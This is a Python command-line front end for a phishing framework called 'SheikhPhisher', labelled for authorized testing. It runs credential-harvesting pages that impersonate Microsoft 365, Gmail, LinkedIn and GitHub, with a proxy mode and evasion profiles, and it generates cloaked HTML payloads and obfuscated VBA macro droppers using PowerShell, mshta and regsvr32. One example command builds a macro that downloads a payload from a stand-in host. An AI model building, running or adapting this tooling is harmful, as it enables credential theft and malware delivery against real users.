#!/usr/bin/env python3
# sheikhphisher.py - SheikhPhisher Main CLI
# Sheikh-CoedexTech | Authorized Security Testing Only

import os, sys, json, yaml, argparse, time, logging, shutil
from datetime import datetime
from modules.server import PhishingServer
from modules.harvester import CredentialHarvester
from modules.delivery import DeliveryEngine
from modules.evasion import EvasionEngine
from modules.gophish_integration import GophishManager
from modules.report import ReportGenerator
from payloads.html_cloaker import HTMLCloaker
from payloads.macro_gen import MacroGenerator

BANNER = r"""
   _____ _     _      _    _____  _     _     _               
  / ____| |   (_)    | |  |  __ \| |   (_)   | |              
 | (___ | |__  _  ___| | _| |__) | |__  _ ___| |__   ___ _ __ 
  \___ \| '_ \| |/ _ \ |/ /  ___/| '_ \| / __| '_ \ / _ \ '__|
  ____) | | | | |  __/   <| |    | | | | \__ \ | | |  __/ |   
 |_____/|_| |_|_|\___|_|\_\_|    |_| |_|_|___/_| |_|\___|_|   
         SheikhPhisher v1.0 - by Sheikh-CoedexTech
   Authorized Penetration Testing Tool
"""

MODES = {
    '1': 'serve',
    '2': 'campaign',
    '3': 'gophish',
    '4': 'gentpl',
    '5': 'payload',
    '6': 'macro',
    '7': 'report',
}

TEMPLATE_SOURCES = {
    'microsoft365': './templates/microsoft365',
    'gmail':        './templates/gmail',
    'generic':      './templates/generic',
    'linkedin':     './templates/linkedin',
    'github':       './templates/github',
    'custom':       './templates/custom',
}

LOG_LEVELS = {'debug': logging.DEBUG, 'info': logging.INFO, 'warning': logging.WARNING, 'error': logging.ERROR}


def load_config(path='config/settings.yaml'):
    with open(path, 'r') as f:
        return yaml.safe_load(f)


def setup_logging(level='info', logfile=None):
    log_level = LOG_LEVELS.get(level, logging.INFO)
    handlers = [logging.StreamHandler()]
    if logfile:
        handlers.append(logging.FileHandler(logfile))
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=handlers,
        datefmt='%Y-%m-%d %H:%M:%S'
    )


def generate_template(target, output):
    src_dir = TEMPLATE_SOURCES.get(target)
    if not src_dir or not os.path.exists(src_dir):
        print(f"[-] Template '{target}' not found at {src_dir}")
        return
    os.makedirs(output, exist_ok=True)
    for fname in os.listdir(src_dir):
        src_path = os.path.join(src_dir, fname)
        if os.path.isfile(src_path):
            shutil.copy2(src_path, os.path.join(output, fname))
            print(f"  [✓] Copied: {fname}")
    print(f"\n[+] Template '{target}' generated at: {output}")


def generate_cloaked_payload(page_url, cloak_method, output):
    HTMLCloaker.generate(page_url, method=cloak_method, output=output)
    print(f"\n[+] Cloaked payload ({cloak_method}) saved to: {output}")


def macro_mode(args):
    if args.technique in ('http_download', 'mshta', 'regsvr32', 'encrypted_stage') and not args.url:
        print("[-] --url is required for technique: " + args.technique)
        sys.exit(1)
    if args.technique in ('powershell_inject', 'wmi_exec', 'dotnet_rundll32') and not args.command and not args.url:
        print("[-] --command or --url is required for technique: " + args.technique)
        sys.exit(1)

    MacroGenerator.generate(
        command=args.command,
        url=args.url,
        technique=args.technique,
        obfuscation=args.obfuscation,
        output=args.output,
        doc_format=args.format
    )
    print(f"\n[+] Macro saved to: {args.output}")

    if args.print:
        with open(args.output) as f:
            print(f.read())


def main():
    parser = argparse.ArgumentParser(
        description='SheikhPhisher - Advanced Phishing Simulation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Quick start — number mode:
  python3 sheikhphisher.py 1 --domain phish-test.com --template microsoft365 --ssl --proxy-mode --target-url https://login.microsoftonline.com
  python3 sheikhphisher.py 4 --target gmail --output ./ops/gmail
  python3 sheikhphisher.py 6 --technique powershell_inject --command "powershell ..." --obfuscation high

  # Or use full mode names:
  python3 sheikhphisher.py serve --domain phish-test.com --template generic --ssl
  python3 sheikhphisher.py macro --technique encrypted_stage --url https://phish-test.com/payload.bin
        """
    )

    subparsers = parser.add_subparsers(dest='mode', help='Operating mode (use number or name)')

    # 1 — Serve
    p = subparsers.add_parser('1', aliases=['serve'], help='[1] Start phishing server')
    p.add_argument('--host', default='0.0.0.0')
    p.add_argument('--port', type=int, default=443)
    p.add_argument('--template', default='microsoft365', choices=list(TEMPLATE_SOURCES.keys()))
    p.add_argument('--domain', required=True)
    p.add_argument('--ssl', action='store_true')
    p.add_argument('--proxy-mode', action='store_true')
    p.add_argument('--target-url')
    p.add_argument('--evasion-profile', default='balanced', choices=['stealth','balanced','aggressive'])

    # 2 — Campaign
    p = subparsers.add_parser('2', aliases=['campaign'], help='[2] Run phishing campaign')
    p.add_argument('--config', required=True)
    p.add_argument('--gophish', action='store_true')

    # 3 — Gophish
    p = subparsers.add_parser('3', aliases=['gophish'], help='[3] Gophish management')
    p.add_argument('--action', required=True, choices=['create-user','create-group','create-template','create-campaign','launch','status','results'])
    p.add_argument('--api-key')
    p.add_argument('--host', default='https://127.0.0.1:3333')

    # 4 — Generate template
    p = subparsers.add_parser('4', aliases=['gentpl'], help='[4] Generate phishing template')
    p.add_argument('--target', required=True, choices=list(TEMPLATE_SOURCES.keys()))
    p.add_argument('--output', default='./templates/custom')

    # 5 — HTML cloak payload
    p = subparsers.add_parser('5', aliases=['payload'], help='[5] Generate cloaked HTML payload')
    p.add_argument('--page-url', required=True)
    p.add_argument('--cloak', choices=['redirect','iframe','webpack','none'], default='iframe')
    p.add_argument('--output', default='./payloads/landing.html')

    # 6 — Macro
    p = subparsers.add_parser('6', aliases=['macro'], help='[6] Generate VBA macro payload')
    p.add_argument('--technique', default='powershell_inject', choices=['http_download','powershell_inject','wmi_exec','mshta','regsvr32','dotnet_rundll32','encrypted_stage'])
    p.add_argument('--command')
    p.add_argument('--url')
    p.add_argument('--obfuscation', default='medium', choices=['low','medium','high'])
    p.add_argument('--output', default='./payloads/sheikh_macro.bas')
    p.add_argument('--format', default='dotm', choices=['dotm','docm','xlsm','pptm'])
    p.add_argument('--print', action='store_true')

    # 7 — Report
    p = subparsers.add_parser('7', aliases=['report'], help='[7] Generate assessment report')
    p.add_argument('--input', required=True)
    p.add_argument('--format', default='html', choices=['html','json','pdf'])

    args = parser.parse_args()

    if not args.mode:
        print(BANNER)
        print("\nAvailable modes:\n")
        print("  Number   |  Name        |  Description")
        print("  ---------+--------------+-----------------------------------")
        print("   1       |  serve       |  Start phishing server")
        print("   2       |  campaign    |  Run full phishing campaign")
        print("   3       |  gophish     |  Gophish integration")
        print("   4       |  gentpl      |  Generate phishing template")
        print("   5       |  payload     |  Generate cloaked HTML payload")
        print("   6       |  macro       |  Generate VBA macro payload")
        print("   7       |  report      |  Generate assessment report")
        print("\n  Usage: python3 sheikhphisher.py <number> [options]")
        print("         python3 sheikhphisher.py <name> [options]")
        print("\n" + parser.epilog)
        sys.exit(0)

    print(BANNER)
    mode_name = MODES.get(args.mode, args.mode)
    print(f"[*] Mode: {args.mode} ({mode_name})")
    print(f"[*] Started at: {datetime.utcnow().isoformat()}")
    print("-" * 55)

    config = {}
    if os.path.exists('config/settings.yaml'):
        config = load_config('config/settings.yaml')
    else:
        print("[!] config/settings.yaml not found — using defaults")

    setup_logging(config.get('logging', {}).get('level', 'info'))
    log = logging.getLogger(__name__)

    if args.mode in ('1', 'serve'):
        PhishingServer(
            host=args.host, port=args.port,
            domain=args.domain, template=args.template,
            use_ssl=args.ssl, proxy_mode=args.proxy_mode,
            target_url=args.target_url,
            evasion_profile=args.evasion_profile,
            config=config
        ).run()

    elif args.mode in ('2', 'campaign'):
        if args.gophish:
            GophishManager(config.get('gophish', {})).run_campaign(args.config)
        else:
            with open(args.config) as f:
                cfg = json.load(f)
            srv = PhishingServer(config=config)
            srv.start_campaign(cfg, CredentialHarvester(config=config), DeliveryEngine(config=config))

    elif args.mode in ('3', 'gophish'):
        gm = GophishManager({'host': args.host, 'api_key': args.api_key})
        getattr(gm, f'cmd_{args.action}')()

    elif args.mode in ('4', 'gentpl'):
        generate_template(args.target, args.output)

    elif args.mode in ('5', 'payload'):
        generate_cloaked_payload(args.page_url, args.cloak, args.output)

    elif args.mode in ('6', 'macro'):
        macro_mode(args)

    elif args.mode in ('7', 'report'):
        rg = ReportGenerator()
        rg.generate(args.input, args.format)

    print(f"\n[✓] SheikhPhisher completed: {datetime.utcnow().isoformat()}")


if __name__ == '__main__':
    main()